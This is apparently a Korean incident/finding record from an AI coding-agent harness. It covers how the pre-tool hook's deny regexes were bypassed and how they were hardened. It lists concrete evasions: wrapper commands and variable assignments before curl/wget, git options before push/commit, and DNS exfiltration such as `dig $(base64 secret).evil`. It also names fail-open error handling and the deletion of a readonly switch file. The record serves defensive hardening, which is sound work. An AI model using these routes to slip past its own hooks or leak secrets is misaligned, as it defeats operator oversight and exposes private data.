# 007 — 훅 정규식은 명령의 앞머리를 몰랐다

- **발견** — 2026-08-29 보안 리뷰(읽기 전용, 실측 재현). `hooks/pre-tool` 의 거부 규칙이 다음을 통과시켰다: `git -C /tmp/wt push`·`git -c k=v commit`(옵션이 서브명령 앞에), `env HTTP_PROXY=x curl`·`HTTP_PROXY=x curl`·`time curl`·`nice -n 5 wget`·`xargs -I{} curl {}`(wrapper·변수 할당이 명령 앞에), `env python3 <<PY`(인터프리터 heredoc 앞의 wrapper → 본문이 스캔에서 빠짐), `dig $(base64 secret).evil`·`nslookup`·`host`·`getent`(DNS 유출), `open https://evil/?d=`(macOS), `rm .harness-readonly`(D4 스위치 삭제). 훅 입력 파싱 실패·예외는 exit 1(Claude Code 에선 비차단) 로 통과됐고, domain.json 파손은 public 폴백이었다.
- **증상** — 러너 모드·private repo 의 "네트워크·commit/push 다리" 가 정규식 하나에 걸려 있는데 그 정규식이 셸 문법의 앞머리(옵션·wrapper·할당)를 몰랐다.
- **피해** — 실전 밤에서 우회가 관측된 적은 없다(모델이 시도하지 않았다). 그러나 findings/001 의 교훈대로 "열거는 불완전" 하며, push·네트워크는 러너의 git status 최종 판정이 덮지 못하는 영역이라 훅이 유일한 방어였다.
- **원인** — 규칙이 `\bgit\s+(push|commit)` 처럼 *명령 바로 뒤* 만 보았다. wrapper 와 옵션은 셸 문법이지 명령의 일부가 아니라는 사실을 정규식에 안 적었다.
- **해소** — `harnesslib.WRAPPER_RE`(sudo/env/time/nice/nohup/stdbuf/command/exec/caffeinate/xargs/uv run/poetry run/pipx run + `VAR=x`)·`pre-tool._GIT`(옵션 소비)·`_NET`(DNS·open 포함)·`_RM_RE`(삭제도 쓰기 대상)·fail-closed(deny 출력, private 폴백)·MCP 도구(`mcp__*`) matcher.
- **재발 방지** — `tests/test_hooks.py::test_hardening_*` 7개, `tests/test_harnesslib.py::HardeningLibTests`.
- **가정 변경** — ASSUMPTIONS "훅 fail-closed". 한계로 *고정* 한 것: 인터프리터 코드 안의 네트워크 호출(`python3 -c "urllib..."`) 은 훅이 못 잡는다 — 테스트가 계약으로 못박아 아무도 정규식으로 잡으려 들지 않게 했다. 그것은 샌드박스의 몫이다.
- **일반화** — 거부 규칙은 "무엇을 막나" 만이 아니라 "명령이 어디서 시작하나" 를 알아야 한다. 러너의 최종 판정(트리 변화)이 못 덮는 영역(push·egress)은 훅 밖 관측(원격 ref 변화·네트워크 카운터)이 다음 단계다 — v0 범위 밖.
